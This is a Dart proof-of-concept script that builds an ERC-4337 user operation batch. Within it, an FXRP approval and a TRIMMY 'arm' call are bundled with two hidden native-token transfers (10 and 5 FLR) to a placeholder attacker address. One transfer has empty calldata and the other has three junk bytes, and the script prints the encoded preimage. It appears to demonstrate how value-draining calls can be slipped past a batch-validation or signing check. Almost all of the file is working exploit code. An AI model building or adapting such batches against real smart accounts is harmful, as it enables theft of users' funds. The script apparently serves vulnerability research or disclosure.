// PoC: build a 3-call batch where call #3 is a bare native-value transfer with
// empty calldata, and a 4th with 3 bytes of calldata. Writes the preimage hex.
import 'dart:io';
import 'dart:typed_data';
import 'package:plimsoll_core/plimsoll_core.dart' as p;

const executeUserOpSelector = 0x8dd7712f; // placeholder, replaced below

Uint8List sel(String hex) => Uint8List.fromList([
      for (var i = 0; i < 8; i += 2) int.parse(hex.substring(i, i + 2), radix: 16),
    ]);

Uint8List encodeCalls(List<(String, BigInt, Uint8List)> calls, Uint8List selector) {
  // head: array offset ; then array: length, N element offsets, N element tails
  final elements = <Uint8List>[];
  for (final c in calls) {
    // tuple(address,uint256,bytes): head 3 words, tail = dynamic bytes
    elements.add(p.abiConcat([
      p.abiAddressWord(c.$1),
      p.abiWord(c.$2),
      p.abiWord(BigInt.from(0x60)),
      p.abiDynamicBytes(c.$3),
    ]));
  }
  var cursor = calls.length * 32;
  final offsets = <Uint8List>[];
  for (final e in elements) {
    offsets.add(p.abiWord(BigInt.from(cursor)));
    cursor += e.length;
  }
  return p.abiConcat([
    selector,
    p.abiWord(BigInt.from(32)),
    p.abiWord(BigInt.from(calls.length)),
    ...offsets,
    ...elements,
  ]);
}

void main(List<String> args) {
  final selector = sel(args[0]); // executeUserOp selector, passed in
  final trimmy = '0xf73a2af06b315adaa1afe2c1a6c1a6933d8a6554';
  final fxrp = '0x0b6a3645c240605887a5532109323a3e12273dc7';
  final attacker = '0x00000000000000000000000000000000dEaDbEeF';

  // 1. FXRP.approve(TRIMMY, 1.0094e6)
  final approve = p.abiConcat([
    sel('095ea7b3'),
    p.abiAddressWord(trimmy),
    p.abiWord(BigInt.from(1009400)),
  ]);

  // 2. TRIMMY.arm(...), 14 words of plausible args
  final arm = p.abiConcat([
    sel('c33d4cc3'),
    for (var i = 0; i < 14; i++) p.abiWord(BigInt.from(i == 9 ? 1786000000 : 1)),
  ]);

  final calls = <(String, BigInt, Uint8List)>[
    (fxrp, BigInt.zero, approve),
    (trimmy, BigInt.zero, arm),
    // 3. bare native transfer, empty calldata, 10 FLR
    (attacker, BigInt.parse('10000000000000000000'), Uint8List(0)),
    // 4. 3 bytes of calldata, 5 FLR
    (attacker, BigInt.parse('5000000000000000000'), Uint8List.fromList([0xde, 0xad, 0xbe])),
  ];

  final op = p.PackedUserOperation(
    sender: '0x07a76b5c3d03f5bff4cb3e043b1d17a1b40920bf',
    nonce: BigInt.zero,
    callData: encodeCalls(calls, selector),
  );
  final enc = op.encode();
  stdout.writeln('0x${enc.map((b) => b.toRadixString(16).padLeft(2, '0')).join()}');
}
